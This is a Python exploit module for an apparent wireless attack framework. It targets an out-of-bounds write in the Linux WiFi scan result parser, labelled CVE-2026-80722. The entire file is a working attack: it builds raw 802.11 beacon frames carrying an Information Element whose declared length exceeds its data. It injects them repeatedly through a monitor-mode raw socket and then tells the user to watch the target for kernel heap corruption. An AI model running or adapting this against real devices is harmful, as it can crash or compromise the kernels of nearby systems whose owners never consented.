# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Linux WiFi Subsystem Out-of-Bounds Write (CVE-2026-80722).

    The Linux WiFi subsystem contains an out-of-bounds write
    vulnerability in the scan result processing path.  When a beacon
    or probe response frame contains a corrupted Information Element
    with a length field that exceeds the remaining frame data, the
    parser writes beyond the allocated scan result buffer.  This can
    be triggered remotely by any attacker within WiFi range broadcasting
    crafted beacons.

    The vulnerability enables kernel heap corruption, potentially
    leading to arbitrary code execution at ring 0.

    CVSS v3.1: ~8.8 (High), AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Linux WiFi Subsystem OOB Write (CVE-2026-80722)",
        "description": (
            "Exploits CVE-2026-80722, an out-of-bounds write in the "
            "Linux WiFi scan result parser.  A beacon with a corrupted "
            "IE length field causes the parser to write past the "
            "allocated scan result buffer, corrupting kernel heap "
            "memory.  Achievable from adjacent network without "
            "authentication."
        ),
        "authors": (
            "NVD (advisory pending)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-80722",
            "https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git",
        ),
        "disclosure_date": "2026-07-01",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "Linux kernels with cfg80211/mac80211 (vulnerable versions)",
            "All WiFi chipsets using the generic scan path",
            "Ubuntu, Fedora, Debian, Arch (unpatched)",
        ),
    }

    target = OptIP("", "Target station MAC address")
    port = OptPort(1, "Not used (WiFi frame injection)")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    interface = OptString("wlan0mon", "Monitor-mode wireless interface")
    overflow_ie_size = OptInteger(255, "Corrupted IE length value")
    injection_rounds = OptInteger(32, "Number of beacon injection rounds")

    _FRAME_TYPE_MGMT = 0x00
    _SUBTYPE_BEACON = 0x08
    _SUBTYPE_PROBE_REQ = 0x04

    _IE_SSID = 0
    _IE_SUPPORTED_RATES = 1
    _IE_DS_PARAMETER = 3

    _BROADCAST = b"\xff\xff\xff\xff\xff\xff"
    _FAKE_BSSID = b"\x02\x00\x00\x00\x00\x01"

    def _build_radiotap_header(self) -> bytes:
        return struct.pack("<BBHI", 0, 0, 8, 0)

    def _build_frame_control(self, subtype: int) -> bytes:
        fc = (self._FRAME_TYPE_MGMT & 0x03) | ((subtype & 0x0F) << 4)
        return struct.pack("<BB", fc, 0x00)

    def _build_corrupted_ie(self) -> bytes:
        """Build an IE with length exceeding actual data.

        The IE declares a length of overflow_ie_size but provides
        only a small payload.  The parser allocates based on remaining
        frame data but copies based on the declared length, writing
        beyond the buffer boundary.
        """
        ie_type = 50
        actual_data = b"\x42" * 16
        return struct.pack("BB", ie_type, self.overflow_ie_size) + actual_data

    def _build_oob_beacon(self, seq: int) -> bytes:
        fc = self._build_frame_control(self._SUBTYPE_BEACON)
        duration = struct.pack("<H", 0)
        dst = self._BROADCAST
        src = self._FAKE_BSSID
        seq_ctrl = struct.pack("<H", (seq & 0x0FFF) << 4)
        header = fc + duration + dst + src + src + seq_ctrl

        timestamp = struct.pack("<Q", int(time.time() * 1_000_000) & 0xFFFFFFFFFFFFFFFF)
        beacon_interval = struct.pack("<H", 100)
        capability = struct.pack("<H", 0x0431)
        fixed = timestamp + beacon_interval + capability

        ssid_ie = struct.pack("BB", self._IE_SSID, 7) + b"oob-fuz"
        rates_ie = struct.pack("BB", self._IE_SUPPORTED_RATES, 4) + bytes([0x82, 0x84, 0x8B, 0x96])
        ds_ie = struct.pack("BB", self._IE_DS_PARAMETER, 1) + struct.pack("B", 6)
        corrupted_ie = self._build_corrupted_ie()

        body = fixed + ssid_ie + rates_ie + ds_ie + corrupted_ie
        radiotap = self._build_radiotap_header()
        return radiotap + header + body

    def _build_probe_request(self) -> bytes:
        fc = self._build_frame_control(self._SUBTYPE_PROBE_REQ)
        duration = struct.pack("<H", 0)
        header = fc + duration + self._BROADCAST + self._FAKE_BSSID + self._BROADCAST + struct.pack("<H", 0)
        ssid_ie = struct.pack("BB", 0, 0)
        rates_ie = struct.pack("BB", 1, 4) + bytes([0x02, 0x04, 0x0B, 0x16])
        radiotap = self._build_radiotap_header()
        return radiotap + header + ssid_ie + rates_ie

    def _inject_frame(self, raw_sock: socket.socket, frame: bytes) -> bool:
        try:
            raw_sock.send(frame)
            return True
        except OSError:
            return False

    def _open_raw_wifi(self) -> socket.socket | None:
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout)
            sock.bind((str(self.interface), 0))
            return sock
        except OSError:
            return None

    @mute
    def check(self) -> bool:
        raw = self._open_raw_wifi()
        if raw is None:
            return False
        try:
            probe = self._build_probe_request()
            self._inject_frame(raw, probe)
            return True
        finally:
            raw.close()

    def run(self) -> None:
        if not self.interface:
            print_error("interface is required (e.g. wlan0mon)")
            return
        if not self.check():
            print_error("Cannot open raw socket on monitor interface")
            return
        print_success("Monitor-mode socket established; injecting OOB write beacons")
        self._exploit()

    def _exploit(self) -> None:
        raw = self._open_raw_wifi()
        if raw is None:
            print_error("Failed to open raw socket")
            return

        print_status(
            f"Injecting {self.injection_rounds} beacons with "
            f"corrupted IE (declared length: {self.overflow_ie_size})"
        )

        success = 0
        for rnd in range(self.injection_rounds):
            beacon = self._build_oob_beacon(rnd)
            if self._inject_frame(raw, beacon):
                success += 1
            time.sleep(0.01)

        raw.close()

        print_status(f"Injected {success}/{self.injection_rounds} OOB beacons")
        print_info(
            "The corrupted IE declares a length far exceeding its "
            "actual data.  The Linux WiFi scan parser copies based on "
            "declared length, writing beyond the scan result buffer.  "
            "Monitor the target for kernel heap corruption."
        )
